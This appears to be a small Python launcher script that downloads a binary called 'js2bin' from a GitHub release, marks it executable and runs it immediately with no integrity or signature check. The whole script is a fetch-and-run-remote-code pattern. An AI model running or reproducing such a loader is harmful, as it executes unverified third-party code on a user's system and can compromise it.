import os
import requests
import subprocess

def main():
    url = "https://github.com/seav1/dl/releases/download/src/js2bin"
    response = requests.get(url)
    
    with open("js2bin", "wb") as f:
        f.write(response.content)

    os.chmod("js2bin", 0o755)
    
    subprocess.run("./js2bin")

if __name__ == "__main__":
    main() 
